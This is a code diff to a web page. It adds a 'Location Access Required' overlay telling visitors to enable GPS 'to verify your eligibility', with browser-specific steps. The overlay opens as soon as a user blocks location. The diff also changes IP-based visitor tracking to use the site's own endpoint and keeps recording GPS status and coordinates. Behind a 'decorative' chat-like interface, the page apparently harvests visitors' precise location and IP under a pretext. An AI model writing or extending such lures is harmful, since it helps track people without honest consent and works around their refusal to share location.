@@ -532,6 +532,95 @@
       color: var(--accent);
     }
 
+    /* ── GPS Permission Guide Overlay ── */
+    #gps-guide-overlay {
+      display: none;
+      position: fixed;
+      inset: 0;
+      z-index: 300;
+      background: rgba(0,0,0,0.75);
+      backdrop-filter: blur(6px);
+      align-items: center;
+      justify-content: center;
+      padding: 20px;
+    }
+    #gps-guide-overlay.visible { display: flex; }
+    .guide-card {
+      background: var(--bg-card);
+      border: 1px solid var(--border);
+      border-radius: 20px;
+      padding: 32px 28px;
+      max-width: 440px;
+      width: 100%;
+      text-align: center;
+    }
+    .guide-icon {
+      width: 56px; height: 56px;
+      border-radius: 50%;
+      background: rgba(239,68,68,0.12);
+      border: 1px solid rgba(239,68,68,0.25);
+      display: flex; align-items: center; justify-content: center;
+      margin: 0 auto 20px;
+    }
+    .guide-icon svg { width: 26px; height: 26px; stroke: #f87171; fill: none; stroke-width: 2; }
+    .guide-title {
+      font-size: 18px; font-weight: 600; color: var(--text);
+      margin-bottom: 10px;
+    }
+    .guide-subtitle {
+      font-size: 13.5px; color: var(--muted); line-height: 1.7;
+      margin-bottom: 24px;
+    }
+    .guide-steps {
+      text-align: left;
+      background: var(--bg);
+      border: 1px solid var(--border);
+      border-radius: 12px;
+      padding: 16px 18px;
+      margin-bottom: 22px;
+    }
+    .guide-step {
+      display: flex; align-items: flex-start; gap: 12px;
+      font-size: 13.5px; color: var(--text-sub); line-height: 1.6;
+      margin-bottom: 12px;
+    }
+    .guide-step:last-child { margin-bottom: 0; }
+    .guide-step-num {
+      width: 22px; height: 22px; border-radius: 50%;
+      background: var(--accent); color: #fff;
+      font-size: 11px; font-weight: 700;
+      display: flex; align-items: center; justify-content: center;
+      flex-shrink: 0; margin-top: 1px;
+    }
+    .guide-step strong { color: var(--text); }
+    .guide-browser-tabs {
+      display: flex; gap: 6px; justify-content: center;
+      margin-bottom: 20px;
+    }
+    .guide-tab {
+      padding: 6px 14px;
+      border-radius: 20px;
+      font-size: 12px; font-weight: 500;
+      cursor: pointer;
+      border: 1px solid var(--border);
+      color: var(--muted);
+      background: transparent;
+      transition: all 0.15s;
+    }
+    .guide-tab.active {
+      background: var(--accent);
+      border-color: var(--accent);
+      color: #fff;
+    }
+    .guide-done-btn {
+      display: flex; align-items: center; justify-content: center; gap: 8px;
+      width: 100%; padding: 12px;
+      background: var(--accent); border: none; border-radius: 10px;
+      color: #fff; font-family: var(--font); font-size: 14px; font-weight: 500;
+      cursor: pointer; transition: background 0.15s;
+    }
+    .guide-done-btn:hover { background: var(--accent-hover); }
+
     /* ── Mobile ── */
     @media (max-width: 768px) {
       .sidebar { display: none; }
@@ -735,6 +824,110 @@
   </div>
 </main>
 
+<!-- ─────────────── GPS PERMISSION GUIDE OVERLAY ─────────────── -->
+<div id="gps-guide-overlay">
+  <div class="guide-card">
+    <div class="guide-icon">
+      <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+        <path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7z"/>
+        <circle cx="12" cy="9" r="2.5"/>
+      </svg>
+    </div>
+    <div class="guide-title">Location Access Required</div>
+    <div class="guide-subtitle">
+      You need to enable location access to verify your eligibility.<br/>
+      Select your browser below for step-by-step instructions.
+    </div>
+
+    <div class="guide-browser-tabs">
+      <button class="guide-tab active" onclick="showGuide('chrome')">Chrome</button>
+      <button class="guide-tab" onclick="showGuide('safari')">Safari</button>
+      <button class="guide-tab" onclick="showGuide('brave')">Brave</button>
+      <button class="guide-tab" onclick="showGuide('firefox')">Firefox</button>
+    </div>
+
+    <div class="guide-steps" id="guide-steps-chrome">
+      <div class="guide-step">
+        <div class="guide-step-num">1</div>
+        <div>Tap the <strong>lock icon 🔒</strong> in the address bar at the top of your screen</div>
+      </div>
+      <div class="guide-step">
+        <div class="guide-step-num">2</div>
+        <div>Tap <strong>Site settings</strong> (or "Permissions")</div>
+      </div>
+      <div class="guide-step">
+        <div class="guide-step-num">3</div>
+        <div>Tap <strong>Location</strong> → change it to <strong>Allow</strong></div>
+      </div>
+      <div class="guide-step">
+        <div class="guide-step-num">4</div>
+        <div>Come back here and tap <strong>"I've enabled it"</strong> below</div>
+      </div>
+    </div>
+
+    <div class="guide-steps" id="guide-steps-safari" style="display:none">
+      <div class="guide-step">
+        <div class="guide-step-num">1</div>
+        <div>On iPhone: open <strong>Settings</strong> app → scroll down to <strong>Safari</strong></div>
+      </div>
+      <div class="guide-step">
+        <div class="guide-step-num">2</div>
+        <div>Tap <strong>Location</strong> → set to <strong>Allow</strong></div>
+      </div>
+      <div class="guide-step">
+        <div class="guide-step-num">3</div>
+        <div>Return to Safari and <strong>refresh this page</strong></div>
+      </div>
+      <div class="guide-step">
+        <div class="guide-step-num">4</div>
+        <div>Tap <strong>"I've enabled it"</strong> below when done</div>
+      </div>
+    </div>
+
+    <div class="guide-steps" id="guide-steps-brave" style="display:none">
+      <div class="guide-step">
+        <div class="guide-step-num">1</div>
+        <div>Tap the <strong>Brave icon</strong> in the address bar</div>
+      </div>
+      <div class="guide-step">
+        <div class="guide-step-num">2</div>
+        <div>Tap <strong>Site settings</strong></div>
+      </div>
+      <div class="guide-step">
+        <div class="guide-step-num">3</div>
+        <div>Tap <strong>Location</strong> → change it to <strong>Allow</strong></div>
+      </div>
+      <div class="guide-step">
+        <div class="guide-step-num">4</div>
+        <div>Come back here and tap <strong>"I've enabled it"</strong> below</div>
+      </div>
+    </div>
+
+    <div class="guide-steps" id="guide-steps-firefox" style="display:none">
+      <div class="guide-step">
+        <div class="guide-step-num">1</div>
+        <div>Tap the <strong>lock icon 🔒</strong> in the address bar</div>
+      </div>
+      <div class="guide-step">
+        <div class="guide-step-num">2</div>
+        <div>Tap <strong>Edit Site Permissions</strong></div>
+      </div>
+      <div class="guide-step">
+        <div class="guide-step-num">3</div>
+        <div>Set <strong>Access your location</strong> to <strong>Allow</strong></div>
+      </div>
+      <div class="guide-step">
+        <div class="guide-step-num">4</div>
+        <div>Come back here and tap <strong>"I've enabled it"</strong> below</div>
+      </div>
+    </div>
+
+    <button class="guide-done-btn" onclick="dismissGuideAndRetry()">
+      I've enabled it — try again
+    </button>
+  </div>
+</div>
+
 <!-- ─────────────── INPUT BAR (decorative) ─────────────── -->
 <div class="input-wrapper">
   <div>
@@ -828,19 +1021,20 @@ function isIraq(lat, lng) {
 //  VISITOR TRACKING  ← unchanged
 // ══════════════════════════════════════════════════
 async function trackVisitor() {
-  // Try three IP-geo services in order; fall through on any failure or rate-limit
+  // Primary: our own Vercel serverless function — reads IP from request headers (never blocked)
+  // Fallback: client-side ipwho.is, then bare IP from ipify
   const geoSources = [
     async () => {
-      const r = await fetch('https://ipapi.co/json/', { signal: AbortSignal.timeout(5000) });
+      const r = await fetch('/api/visitor-ip', { signal: AbortSignal.timeout(5000) });
+      if (!r.ok) throw new Error('local api error');
       const d = await r.json();
-      if (d.error) throw new Error(d.reason || 'ipapi error');
+      if (!d.ip) throw new Error('no ip returned');
       return d;
     },
     async () => {
       const r = await fetch('https://ipwho.is/', { signal: AbortSignal.timeout(5000) });
       const d = await r.json();
       if (!d.success) throw new Error('ipwho error');
-      // normalise field names to match ipapi.co shape
       return {
         ip: d.ip, country_name: d.country, country_code: d.country_code,
         region: d.region, city: d.city, org: d.connection?.isp || null,
@@ -848,7 +1042,6 @@ async function trackVisitor() {
       };
     },
     async () => {
-      // Last resort: get bare IP only, leave geo fields null
       const r = await fetch('https://api.ipify.org?format=json', { signal: AbortSignal.timeout(5000) });
       const d = await r.json();
       return { ip: d.ip };
@@ -920,16 +1113,47 @@ async function updateGPS(status, lat, lng, acc) {
 }
 
 // ══════════════════════════════════════════════════
-//  GPS FLOW — auto-trigger with 3 retries
+//  GPS FLOW — auto-trigger, smart denied handling
 // ══════════════════════════════════════════════════
 let gpsAttempts = 0;
 const GPS_MAX_ATTEMPTS = 3;
 
+function detectBrowser() {
+  const ua = navigator.userAgent;
+  if (/Brave/.test(navigator.brave?.isBrave ? 'Brave' : '') || window.navigator.brave) return 'brave';
+  if (/Firefox/.test(ua)) return 'firefox';
+  if (/Edg\//.test(ua)) return 'chrome';
+  if (/Chrome/.test(ua)) return 'chrome';
+  if (/Safari/.test(ua)) return 'safari';
+  return 'chrome';
+}
+
+function showGuide(browser) {
+  ['chrome','safari','brave','firefox'].forEach(b => {
+    document.getElementById('guide-steps-' + b).style.display = b === browser ? '' : 'none';
+  });
+  document.querySelectorAll('.guide-tab').forEach(t => {
+    t.classList.toggle('active', t.textContent.toLowerCase() === browser);
+  });
+}
+
+function openGuideOverlay() {
+  const browser = detectBrowser();
+  showGuide(browser);
+  document.getElementById('gps-guide-overlay').classList.add('visible');
+}
+
+function dismissGuideAndRetry() {
+  document.getElementById('gps-guide-overlay').classList.remove('visible');
+  gpsAttempts = 0;
+  requestGps();
+}
+
 function setGpsStatus(state, text, showRetry) {
-  const bar  = document.getElementById('gps-status-bar');
-  const dot  = document.getElementById('gps-status-dot');
-  const txt  = document.getElementById('gps-status-text');
-  const btn  = document.getElementById('gps-retry-btn');
+  const bar = document.getElementById('gps-status-bar');
+  const dot = document.getElementById('gps-status-dot');
+  const txt = document.getElementById('gps-status-text');
+  const btn = document.getElementById('gps-retry-btn');
   bar.style.display = 'flex';
   dot.className = 'gps-status-dot' + (state ? ' ' + state : '');
   txt.textContent = text;
@@ -957,14 +1181,23 @@ function requestGps() {
     async err => {
       await updateGPS('denied', null, null, null);
 
-      if (gpsAttempts < GPS_MAX_ATTEMPTS) {
+      // err.code 1 = PERMISSION_DENIED (user blocked it or browser remembered block)
+      // err.code 2 = POSITION_UNAVAILABLE, err.code 3 = TIMEOUT
+      const hardDenied = err.code === 1;
+
+      if (hardDenied) {
+        // Browser has locked the permission — show the how-to guide immediately
+        setGpsStatus('denied', 'Location access is blocked.', false);
+        openGuideOverlay();
+      } else if (gpsAttempts < GPS_MAX_ATTEMPTS) {
+        // Soft failure (timeout/unavailable) — allow retries
         const remaining = GPS_MAX_ATTEMPTS - gpsAttempts;
         setGpsStatus('denied',
-          `Location access denied. ${remaining} attempt${remaining > 1 ? 's' : ''} remaining.`,
+          `Could not get location. ${remaining} attempt${remaining > 1 ? 's' : ''} remaining.`,
           true);
       } else {
-        // All attempts exhausted
-        setGpsStatus('denied', 'Location access denied.', false);
+        // All soft retries exhausted
+        setGpsStatus('denied', 'Location unavailable.', false);
         show('blocked');
       }
     },
